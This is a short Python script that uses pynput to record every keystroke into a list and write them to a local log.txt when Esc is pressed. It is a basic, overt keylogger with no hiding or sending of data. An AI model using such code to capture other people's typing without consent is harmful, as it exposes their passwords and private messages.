from pynput import keyboard

keystrokes = []

def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        keystrokes.append(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        save_keys()
        return False

def save_keys():
    with open("log.txt", "w") as file:
        for key in keystrokes:
            file.write(f"{key}\n")

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
